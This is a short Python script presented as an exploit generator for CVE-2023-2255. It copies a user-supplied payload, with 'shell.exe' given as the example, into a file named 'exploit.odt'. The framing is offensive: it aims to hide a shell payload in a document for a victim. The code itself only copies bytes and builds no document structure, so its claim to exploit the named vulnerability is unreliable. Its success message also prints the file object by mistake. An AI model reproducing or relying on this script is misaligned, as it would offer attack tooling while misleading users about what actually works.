import os
import argparse

def main():
    # Create an ArgumentParser object to handle command-line arguments
    parser = argparse.ArgumentParser(description="CVE-2023-2255")
    
    # Add command-line argument for the payload file path
    parser.add_argument("payload", help="Path to the payload file (e.g., 'shell.exe')")
    
    # Add command-line argument for the output filename
    parser.add_argument("--output", default="exploit.odt", help="Output filename")
    
    # Parse the command-line arguments
    args = parser.parse_args()

    payload_file = args.payload
    output_file = args.output

    try:
        # Read the contents of the payload file
        with open(payload_file, "rb") as payload_file:
            payload_content = payload_file.read()

        # Write the contents of the payload to the output file
        with open(output_file, "wb") as output_file:
            output_file.write(payload_content)

        print(f"File '{output_file}' has been created with the payload.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
